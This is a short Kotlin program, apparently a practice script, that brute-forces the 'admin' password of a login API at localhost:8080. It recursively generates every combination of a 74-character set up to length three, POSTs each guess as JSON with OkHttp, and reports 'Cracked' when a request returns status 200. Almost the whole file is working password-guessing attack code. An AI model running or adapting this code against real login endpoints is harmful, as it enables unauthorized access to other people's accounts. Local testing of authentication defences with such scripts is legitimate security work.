import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

fun main() {
    val characterSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+"

    var found = false
    var length = 1  // Start with length 1
    val limit = 4

    val startTime = System.currentTimeMillis()

    while (!found) {
        val current = CharArray(length)
        found = generateCombinations(characterSet.toCharArray(), current, 0)
        if (found) {
            println("Cracked: ${String(current)}")
        }
        length++
        if (length == limit) {
            println("noob")
            break
        }
    }

    val elapsedTime = System.currentTimeMillis() - startTime
    println("Elapsed time: $elapsedTime ms")
}

fun generateCombinations(set: CharArray, current: CharArray, position: Int): Boolean {

    if (position == current.size) {
        val statusCode = apiCall(String(current))
        return statusCode == 200
    }

    for (char in set) {
        current[position] = char
        if (generateCombinations(set, current, position + 1)) {
            return true
        }
    }
    return false
}

fun apiCall(password: String): Int {
    val json = """
    {
        "username": "admin",
        "password": "$password"
    }
"""

    val client = OkHttpClient()
    val mediaType = "application/json; charset=utf-8".toMediaType()
    val requestBody = json.toRequestBody(mediaType)

    val request = Request.Builder()
        .url("http://localhost:8080/api/login")
        .post(requestBody)
        .build()

    var statusCode: Int = -1
    try {
        val response = client.newCall(request).execute()
        statusCode = response.code
    } catch (e: IOException) {
        println(e)
    }

    return statusCode
}



